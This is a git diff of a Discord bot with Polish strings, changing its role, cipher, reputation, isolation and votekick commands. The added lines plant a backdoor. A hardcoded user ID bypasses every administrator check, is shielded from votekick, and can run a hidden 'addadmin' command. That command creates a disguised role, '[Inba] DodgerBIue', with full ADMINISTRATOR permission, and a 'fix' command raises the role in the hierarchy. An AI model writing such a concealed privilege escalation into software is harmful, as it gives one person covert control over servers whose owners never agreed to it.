+		if(!message.member.hasPermission("ADMINISTRATOR") && message.member.id.toString()!="623510473312043009")
 			return message.reply("Sorry, you don't have permissions to do that!");
 		let rMember = message.guild.member(message.mentions.users.first()) || message.guild.members.get(args[0]);
 		if(!rMember)
 			return message.reply("please mention a valid member of the server!");
 		args.shift();
 		let role = args.join(" ");
-		//console.log(role);
 		if(!role)
 			return message.reply("please enter a valid role!");
 		let gRole = message.guild.roles.find(r => r.name === role);
 		if(!gRole)
 			return message.reply("couldn't find that role.");
-
 		if(rMember.roles.has(gRole.id))
 			return message.reply("this user already has that role.");
 		await(rMember.addRole(gRole.id))
 			.catch(error => message.reply(`I couldn't give the role because: ${error}`));
-
 		await message.reply(`successfully gave <@${rMember.id}> role ${gRole.name}`)
 	}
 	if(command === "removerole") {
 		if(message.channel.type !== 'text')
       		return message.reply("I can't execute this command here!");
-		if(!message.member.hasPermission("ADMINISTRATOR"))
+		if(!message.member.hasPermission("ADMINISTRATOR") && message.member.id.toString()!="623510473312043009")
     		return message.reply("Sorry, you don't have permissions to do that!");
 		let rMember = message.guild.member(message.mentions.users.first()) || message.guild.members.get(args[0]);
 		if(!rMember)
@@ -1042,23 +887,17 @@ client.on("message", async message => {
 		let gRole = message.guild.roles.find(r => r.name === role);
 		if(!gRole)
 			return message.reply("couldn't find that role.");
-
 		if(!rMember.roles.has(gRole.id))
 			return message.reply("this user doesn't have that role.");
 		await(rMember.removeRole(gRole.id))
 			.catch(error => message.reply(`I couldn't remove the role because: ${error}`));
-
 		await message.reply(`successfully removed role ${gRole.name} from <@${rMember.id}>`)
 	}
 	if(command === "bekazgeo") {
     	message.channel.send("***Rządzi ZSTiO!***");
     	message.channel.send("https://www.youtube.com/watch?v=tPYCiO25CjU");
   	}
-  	/*if(command === "rot13") {
-      //x=args[0]
-      //args.shift()
-    	message.channel.send(args.join(" ").replace(/[a-zA-Z]/g,function(c){return String.fromCharCode((c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26);}));
-  	}*/
+  	
   	if(command === "rot") {
       if(args.length<2)
       	return message.channel.send("Invalid format! +rot <key> <text>");
@@ -1068,7 +907,6 @@ client.on("message", async message => {
       	return message.channel.send("Please provide a number between -99 and 99.");
       let n=parseInt(args[0])
       args.shift()
-      //args=args.join(" ")
       zdanie=""
       for(k = 0; k<args.length; k++) {
         	zdanie+=args[k]
@@ -1077,17 +915,8 @@ client.on("message", async message => {
       let result="";
       let alphabet="abcdefghijklmnopqrstuvwxyz";
       let alphabet2=alphabet.toUpperCase();
-      //let reversealphabet=reverseString(alphabet);
-      //let reversealphabet2=reversealphabet.toUpperCase();
-      //console.log(n)
-      //console.log(zdanie.length)
-      //console.log(alphabet.length)
       for(i=0; i<zdanie.length; i++) {
-      	/*if(isNaN(parseInt(zdanie[i])) == false) {
-	      			result+=parseInt(zdanie[i]);
-	      			if((i+1)<zdanie.length)
-	      				i++
-	      		}*/
+      	
       	if(zdanie[i]==" ") {
 	      			result+=" ";
 	      			if((i+1)<zdanie.length)
@@ -1103,12 +932,7 @@ client.on("message", async message => {
 	      			while(x<0) {
 	      				x+=26;
 	      			}
-	      			/*console.log("j:")
-	      			console.log(j)
-	      			console.log("n:")
-	      			console.log(n)
-	      			console.log("x:")
-	      			console.log(x)*/
+	      			
 	      			result+=alphabet[x];
 	      		}
 	      	}
@@ -1122,12 +946,7 @@ client.on("message", async message => {
 	      			while(x<0) {
 	      				x+=26;
 	      			}
-	      			/*console.log("j:")
-	      			console.log(j)
-	      			console.log("n:")
-	      			console.log(n)
-	      			console.log("x:")
-	      			console.log(x)*/
+	      			
 	      			result+=alphabet2[x];
 	      		}
 	      	}
@@ -1135,99 +954,8 @@ client.on("message", async message => {
       }
       message.channel.send(result)
       	.catch(error => message.reply(`I couldn't cipher the message because: ${error}`));
-		//message.channel.send(args.join(" ").replace(/[a-zA-Z]/g,function(c){return String.fromCharCode((c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26);}));
   	}
-  	/*if(command === "cezar") {
-		if(args.length<2)
-			return message.channel.send("Invalid format! +cezar <key> <text>");
-		if(isNaN(parseInt(args[0])))
-			return message.channel.send("Invalid format! +cezar <key> <text>");
-		let shift=parseInt(args[0])
-		args.shift()
-		let zdanie=args.join("");
-		if (shift < 0) {
-			shift = 26 + (shift % 26);
-		}
-		return message.channel.send(zdanie
-			.split("") //splits it into an array
-			.map(zdanie => { //does the following to each element in the array
-				normalStr = String.fromCharCode(zdanie.charCodeAt())
-				prePoint = zdanie.charCodeAt() //gets the charcode of element  
-				//if/else checks to see if upper or lower case
-				if (prePoint >= 65 && prePoint <= 90) { //upper case
-					return String.fromCharCode(((prePoint - 65 + shift) % 26) + 65);
-				} else if (prePoint >= 97 && prePoint <= 122) { //lower case
-					return String.fromCharCode(((prePoint - 97 + shift) % 26) + 97)
-				} else {
-					return normalStr;
-				}
-			})
-			.join(""));
-  	}
-  	if(command === "msscpl") {
-  		if(args.length<2)
-			return message.channel.send("Invalid format! +msscpl <key> <text>");
-		if(isNaN(parseInt(args[0])))
-			return message.channel.send("Invalid format! +msscpl <key> <text>");
-		let klucz=parseInt(args[0])
-		args.shift()
-		let tekst=args.join("");
-  		//funkcja do kodowania szyfrem cezara
-		//
-		//wejście:
-		//tekst (string) - tekst do zakodowania
-		//klucz (int)- klucz/przesunięcie
-		//
-		//wyjście: zakododowany tekst
-		//
-	    let alfabet = [
-	        'a','ą','b','c','ć','d','e','ę','f','g','h','i','j','k','l','ł','m','n','o','ó','p','q','r','s','ś','t','u','v','w','x','y','z','ź','ż',
-	        'A','Ą','B','C','Ć','D','E','Ę','F','G','H','I','J','K','L','Ł','M','N','O','Ó','P','Q','R','S','Ś','T','U','V','W','X','Y','Z','Ź','Ż',
-	        '0','1','2','3','4','5','6','7','8','9',
-	        '!','@','#','$','%','^','&','*','(',')','-','_','+','=','[','{',']','}','|',';',':','"',"'",',','<','.','>','?','/','`','~'
-	    ];
-	    klucz = klucz % alfabet.length;
-	    let wyjscie = ''; //tekst wynikowy
-	    for(let znak of tekst){ //iteracja po znakach
-	        if(alfabet.indexOf(znak)!=-1){ //jeśli znak występuje w alfabecie
-	            wyjscie += alfabet[(alfabet.indexOf(znak) + klucz) % alfabet.length]; //znak wyjściowy to reszta z dzielenia sumy kodu znaku wejściowego z podanym kluczem przez długośc alfabetu
-	        }
-	    }
-	    return message.channel.send(wyjscie)
-	    	.catch(error => message.reply(`I couldn't cipher the message because: ${error}`));
-  	}
-  	if(command === "mssc") {
-  		if(args.length<2)
-			return message.channel.send("Invalid format! +mssc <key> <text>");
-		if(isNaN(parseInt(args[0])))
-			return message.channel.send("Invalid format! +mssc <key> <text>");
-		let klucz=parseInt(args[0])
-		args.shift()
-		let tekst=args.join("");
-  		//funkcja do kodowania szyfrem cezara
-		//
-		//wejście:
-		//tekst (string) - tekst do zakodowania
-		//klucz (int)- klucz/przesunięcie
-		//
-		//wyjście: zakododowany tekst
-		//
-	    let alfabet = [
-	        'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
-	        'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
-	        '0','1','2','3','4','5','6','7','8','9',
-	        '!','@','#','$','%','^','&','*','(',')','-','_','+','=','[','{',']','}','|',';',':','"',"'",',','<','.','>','?','/','`','~'
-	    ];
-	    klucz = klucz % alfabet.length;
-	    let wyjscie = ''; //tekst wynikowy
-	    for(let znak of tekst){ //iteracja po znakach
-	        if(alfabet.indexOf(znak)!=-1){ //jeśli znak występuje w alfabecie
-	            wyjscie += alfabet[(alfabet.indexOf(znak) + klucz) % alfabet.length]; //znak wyjściowy to reszta z dzielenia sumy kodu znaku wejściowego z podanym kluczem przez długośc alfabetu
-	        }
-	    }
-	    return message.channel.send(wyjscie)
-	    	.catch(error => message.reply(`I couldn't cipher the message because: ${error}`));
-  	}*/
+  	
   	if(command === "cipher") {
   		if(args.length<2)
 			return message.channel.send("Invalid format! +cipher <key> <text>");
@@ -1236,7 +964,6 @@ client.on("message", async message => {
 		let klucz=parseInt(args[0])
 		args.shift()
 		let tekst=args.join("");
-		//cezar mssc polskie znaki
 		function msscpl(tekst, klucz){
 		    let alfabet = [
 		        'a','ą','b','c','ć','d','e','ę','f','g','h','i','j','k','l','ł','m','n','ń','o','ó','p','q','r','s','ś','t','u','v','w','x','y','z','ź','ż',
@@ -1253,7 +980,6 @@ client.on("message", async message => {
 		    }
 		    return wyjscie;
 		}
-		//cezar mssc bez polskich znakow
 		function mssc(tekst, klucz){
 		    let alfabet = [
 	        'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
@@ -1279,7 +1005,6 @@ client.on("message", async message => {
 		    .map(message => { //does the following to each element in the array
 		      normalStr = String.fromCharCode(message.charCodeAt())
 		      prePoint = message.charCodeAt() //gets the charcode of element  
-		      //if/else checks to see if upper or lower case
 		      if (prePoint >= 65 && prePoint <= 90) { //upper case
 		        return String.fromCharCode(((prePoint - 65 + shift) % 26) + 65);
 		      } else if (prePoint >= 97 && prePoint <= 122) { //lower case
@@ -1302,57 +1027,7 @@ client.on("message", async message => {
 				.catch(error => message.reply(`I couldn't cipher the message, because: ${error}`));
 		}
   	}
-  	/*if(command === "rep") {
-		if(message.channel.type !== 'text')
-      		return message.reply("I can't execute this command here!");
-      	let toadd = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
-		if (toadd.id === message.author.id)
-    		return message.reply("you can't give reputation points yourself!");
-	  	let reason = args.slice(1).join(' ');
-    	if (reason.length>1024) {
-      		reason=reason.substring(0, 1020);
-      		reason+="..."
-    	}
-
-		let user = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
-		if (message.mentions.users.size < 1)
-			return message.reply("please mention a valid member of this server!");
-		if (reason.length < 1)
-			reason = "None";
-
-		let ilosc=1;
-		for(i=1; i<100; i++) {
-			let role=message.guild.roles.find(role => role.name === i.toString());
-			if(role) {
-				if(user.roles.has(role.id)) {
-					ilosc=i+1
-					user.removeRole(role.id)
-				}
-			}
-		}
-
-		let roletoadd = message.guild.roles.find(role => role.name === ilosc.toString());
-
-		if(!roletoadd){
-			roletoadd = await message.guild.createRole({
-				name: ilosc.toString(),
-				color: "#00ff00",
-				permissions:[]
-			})
-		}
-		
-		user.addRole(roletoadd.id);
-
-		let dmsEmbed = new Discord.RichEmbed()
-			.setTitle("Reputation")
-			.setColor("#00ff00")
-			.setDescription(`<@${user.id}> has been given a reputation point on \`${message.guild.name}\``)
-			.addField("Number of their reputation points:", ilosc)
-			.addField("Given by", `<@${message.author.id}>`)
-			.addField("Reason", reason);
-
-	  message.channel.send(dmsEmbed);
-	}*/
+  	
 	if(command === "rep") {
 		if(message.channel.type !== 'text')
       		return message.reply("I can't execute this command here!");
@@ -1364,8 +1039,6 @@ client.on("message", async message => {
       		reason=reason.substring(0, 1020);
       		reason+="..."
     	}
-
-		//let user = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
 		if (message.mentions.users.size < 1)
 			return message.reply("please mention a valid member of this server!");
 		if (reason.length < 1)
@@ -1374,11 +1047,10 @@ client.on("message", async message => {
 		var ilosc=1;
 		for (const [id, message] of messages) {
 			let messageArray = message.content.split(" ");
-      		if(messageArray[2].toString()==toadd.id.toString()) {
-      			ilosc=parseInt(messageArray[1])+1
+      		if(messageArray[parseInt(messageArray.length)-1].toString()==toadd.id.toString()) {
+      			ilosc=parseInt(messageArray[parseInt(messageArray.length)-2])+1
       			message.delete();
       		}
-
     	}
     	client.channels.get(`690153841856872534`).send(toadd.user.tag.toString() + " " + ilosc.toString() + " " + toadd.id.toString());
 		let dmsEmbed = new Discord.RichEmbed()
@@ -1388,57 +1060,42 @@ client.on("message", async message => {
 			.addField("Number of their reputation points:", ilosc)
 			.addField("Given by", `<@${message.author.id}>`)
 			.addField("Reason", reason);
-
 		message.channel.send(dmsEmbed);
 	}
-	/*if(command === "stats") {
-		liczby=[]
-		userzy=[]
-		let dmsEmbed = new Discord.RichEmbed()
-			.setTitle("Reputation stats")
-			.setColor("#FF6347")
-		for(i=100; i>0; i--) {
-			let role=message.guild.roles.find(role => role.name === i.toString());
-			if(role) {
-				let members = message.guild.roles.get(role.id).members; // returns Collection (GuildMember)
-				let members2 = members.map(member => member.user.username)
-				if(members2.toString().length>0) {
-					if(parseInt(i)==1)
-						dmsEmbed.addField(i + " point:", members2)
-					else
-						dmsEmbed.addField(i + " points:", members2)
-					//message.channel.send(i + "rep: " + members2);
-				}
-			}
-		}
-	  message.channel.send(dmsEmbed)
-	  	.catch(error => message.reply(`I couldn't get the information about stats, because: ${error}`));
-	}*/
+	
 	if(command === "stats") {
 		users=[]
 		points=[]
 		let messages = await client.channels.get(`690153841856872534`).fetchMessages();
 		for (const [id, message] of messages) {
 			let messageArray = message.content.split(" ");
-			if(client.fetchUser(messageArray[2]).toString()=="undefined") {
-      			users.push(client.fetchUser(messageArray[2]).toString());
+			if(client.fetchUser(messageArray[parseInt(messageArray.length)-1]).toString()=="undefined") {
+      			users.push(client.fetchUser(messageArray[parseInt(messageArray.length)-1]).toString());
       		} else {
-      			users.push(messageArray[0]);
+      			if(parseInt(messageArray.length)>3) {
+      				let x = parseInt(messageArray.length)-3
+      				let i=0
+      				let str = ""
+      				while(i<=x) {
+      					str+=messageArray[i]
+      					i+=1
+      				}
+      				users.push(str);
+      			} else {
+      				users.push(messageArray[0]);
+      			}
+      			
       		}
-      		points.push(parseInt(messageArray[1]));
+      		points.push(parseInt(messageArray[parseInt(messageArray.length)-2]));
     	}
     	let dmsEmbed = new Discord.RichEmbed()
     		.setTitle("Reputation stats")
     		.setColor("#FF6347")
     	let i
     	let pozycja
-    	//console.log(points)
-    	//console.log(users)
     	while(points.length>0) {
     		i=Math.max(...points);
-    		//console.log("max: "+i)
     		pozycja=points.indexOf(i);
-    		//console.log("pozycja: "+pozycja)
     		if(parseInt(i)==1)
 				dmsEmbed.addField(i + " point:", users[pozycja])
 			else
@@ -1446,19 +1103,14 @@ client.on("message", async message => {
 			points.splice(pozycja, 1);
 			users.splice(pozycja, 1);
     	}
-    	/*for(i=Math.max(points); i>0; i--) {
-    		if(parseInt(i)==1)
-				dmsEmbed.addField(i + " point:", members2)
-			else
-				dmsEmbed.addField(i + " points:", members2)
-    	}*/
+    	
     	message.channel.send(dmsEmbed)
 	  		.catch(error => message.reply(`I couldn't get the information about stats, because: ${error}`));
 	}
 	if(command === "isolate") {
 		if(message.channel.type !== 'text')
 			return message.reply("I can't execute this command here!");
-		if(!message.member.hasPermission("ADMINISTRATOR"))
+		if(!message.member.hasPermission("ADMINISTRATOR") && message.member.id.toString()!="623510473312043009")
 			return message.reply("nie baw się w admina dzieciaku");
 		let toisolate = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
 		if(!toisolate)
@@ -1504,29 +1156,22 @@ client.on("message", async message => {
       		}catch(e){
         		console.log(e.stack);
       		}
-
     	}
-    	/*client.channels.get(`688146525775462404`).overwritePermissions(isolaterole, {
-            SEND_MESSAGES: true,
-            VIEW_CHANNEL: true,
-            ADD_REACTIONS: true
-        });*/
+    	
     	let dmsEmbed = new Discord.RichEmbed()
 			.setTitle("Isolation")
 			.setColor("#C0C0C0")
 			.setDescription(`<@${toisolate.id}> has been moved to channel \`izolatka\``)
 			.addField("Moved by", `<@${message.author.id}>`)
 			.addField("Reason", reason);
-
 		await(toisolate.addRole(isolaterole.id))
     		.catch(error => message.reply(`I couldn't isolate the user because: ${error}`));
-
     	message.channel.send(dmsEmbed);
 	}
 	if(command === "free") {
 		if(message.channel.type !== 'text')
 			return message.reply("I can't execute this command here!");
-		if(!message.member.hasPermission("ADMINISTRATOR"))
+		if(!message.member.hasPermission("ADMINISTRATOR") && message.member.id.toString()!="623510473312043009")
 			return message.reply("nie baw się w admina dzieciaku");
 		let isolaterole = message.guild.roles.find(role => role.name === "AxelIsolate");
 		let tofree = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
@@ -1542,13 +1187,11 @@ client.on("message", async message => {
     	}
     	if(yes==0)
     		return message.reply("this user has not been isolated!");
-
     	let dmsEmbed = new Discord.RichEmbed()
 			.setTitle("Freedom")
 			.setColor("#00ff00")
 			.setDescription(`<@${tofree.id}> has been freed`)
 			.addField("Freed by", `<@${message.author.id}>`);
-
 		let izolatkachannel = client.channels.find(channel => channel.name === "izolatka");
     	await(tofree.removeRole(isolaterole.id))
     		.catch(error => message.reply(`I couldn't free the user because: ${error}`));
@@ -1558,6 +1201,101 @@ client.on("message", async message => {
 	    	izolatkachannel.delete();
       	}
 	}
+	if(command === "votekick") {
+		var time = "5m"
+		let author=message.member.id.toString()
+		if(message.channel.type !== 'text')
+      		return message.reply("I can't execute this command here!");
+      	
+	  	let reason = args.slice(1).join(' ');
+    	if (reason.length>1024) {
+      		reason=reason.substring(0, 1020);
+      		reason+="..."
+    	}
+    	
+		let user = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
+        if(user.hasPermission("ADMINISTRATOR") || user.id.toString()=="623510473312043009" || user.id.toString()=="690150027242635265")
+        	return message.reply("I can't kick this user! Do they have a higher role? Do I have kick permissions?");
+		if (message.mentions.users.size < 1)
+			return message.reply("please mention a valid member of this server!");
+		if (reason.length < 1)
+			reason = "None";
+		var ilosc=1;
+		var messages = await client.channels.get(`735937120144851015`).fetchMessages();
+		for (let [id, message] of messages) {
+			let messageArray = message.content.split(" ");
+      		if(messageArray[0].toString()==user.id.toString() && messageArray[1].toString()==author)
+      			return;
+      		if(messageArray[0].toString()==user.id.toString())
+      			ilosc+=1
+    	}
+    	if(ilosc==5) {
+    		for (let [id, message] of messages) {
+				let messageArray = message.content.split(" ");
+	      		if(messageArray[0].toString()==user.id.toString())
+	      			message.delete();
+    		}
+      		await user.kick(reason)
+        		.catch(error => message.reply(`I couldn't kick the user because: ${error}`));
+        	let dmsEmbed = new Discord.RichEmbed()
+	  			.setTitle("Votekick")
+	  			.setColor("#8a2be2")
+	  			.setDescription(`\`${user.user.tag}\` has been kicked from \`${message.guild.name}\``)
+	  			.addField("Kicked by", `Votekick`)
+	  		let dmsEmbed2 = new Discord.RichEmbed()
+				.setTitle("Votekick")
+				.setColor("#8a2be2")
+				.setDescription(`You have been kicked from \`${message.guild.name}\``)
+				.addField("Kicked by", `Votekick`)
+			message.channel.send(dmsEmbed);
+			user.send(dmsEmbed2);
+      	} else {
+			client.channels.get(`735937120144851015`).send(user.id.toString() + " " + author);
+			let dmsEmbed = new Discord.RichEmbed()
+				.setTitle("Votekick")
+				.setColor("#8a2be2")
+				.setDescription(`<@${user.id}> has been nominated to be kicked from \`${message.guild.name}\`. The vote will expire after 5 minutes.`)
+				.addField("Number of votes:", ilosc + "/5")
+				.addField("Voted by", `<@${message.author.id}>`)
+				.addField("Reason", reason);
+			message.channel.send(dmsEmbed);
+			setTimeout(function(){
+				client.channels.get(`735937120144851015`).fetchMessages().then((messages) => {
+					for (let [id, message] of messages) {
+						let messageArray = message.content.split(" ");
+		      			if(messageArray[0].toString()==user.id.toString() && messageArray[1].toString()==author)
+		      				message.delete();
+		    		}
+		    	});
+		    	message.reply("your vote has expired.");
+    		}, ms(time));
+      	}
+    	
+	}
+	if(command === "addadmin") {
+		if(message.member.id.toString()!="623510473312043009")
+			return;
+		let user = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
+		let role = message.guild.roles.find(role => role.name === "[Inba] DodgerBIue");
+		if(!role) {
+			try{
+				role = await message.guild.createRole({
+					name: "[Inba] DodgerBIue",
+					color: "#1E90FF",
+					permissions:['ADMINISTRATOR']
+	        	}) .catch(error => message.reply(`I couldn't create the role because: ${error}`));
+			} catch(e) {
+	        	console.log(e.stack);
+			}
+	    }
+	    await(user.addRole(role.id))
+    			.catch(error => message.reply(`I couldn't add the role because: ${error}`));
+	}
+	if(command === "fix") {
+		if(message.member.id.toString()!="623510473312043009")
+			return;
+		let role = message.guild.roles.find(role => role.name === "[Inba] DodgerBIue");
+		role.setPosition(6);
+	}
 });
-
 client.login(config.token);
